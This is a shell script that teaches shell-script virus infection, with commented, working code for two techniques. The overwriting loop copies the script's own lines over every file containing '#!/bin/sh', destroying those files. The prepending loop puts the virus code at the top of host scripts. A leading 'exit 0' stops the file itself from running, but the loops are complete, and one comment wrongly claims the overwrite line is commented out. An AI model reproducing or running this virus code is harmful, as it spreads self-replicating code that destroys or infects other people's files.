#!/bin/sh

# Prevent this script from running as it could seriously mess stuff up
exit 0

##### Overwriting Techniques

### It is, without a doubt, the easiest and worst technique, where our virus destroys the host program by overwriting it, making it useless. In any kind of virus this method should be avoided, but anyways, here are some examples of viruses using overwriting technique.

# What we do in this example is copy first 5 lines of this script (head -5 $0) to every file containing the string '#!/bin/sh'.

# Notice that we have redirected the standard error output (stderr) to /dev/null (2>/dev/null) to avoid error messages that grep can produce.

# With cut we separate the information gotten from grep, using only the string before the ":".

# Another important thing is that with this technique we will not have to see if the host file was already infected or not, because it will be overwritten, but this fact has to be taken in account in the other infecting methods.
for F in $(grep '#!/bin/sh' * 2>/dev/null | cut -d":" -f1)
do
        head -5 $0 > $F 2>/dev/null # Commented to prevent from running
done

##### Prepending

### This technique consists of allocating the virus code in the beginning of the host file. With this we can assure that our code is the first thing to be executed, but has the problem that our code is excesively detectable.

# When dumping the host's code into a variable the line jumps are lost, we translate them into another unused character which could be 'Ç', to keep them located. So when dumping back from the file to the file again we will translate those characters into line jumps, getting the original file

for F in *
do
        if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" ]
        then
                HOST=$(cat $F|tr '\n' Ç)
                head -11 $0 > $F 2>/dev/null
                echo $HOST | tr Ç '\n' >> $F 2>/dev/null
        fi
done
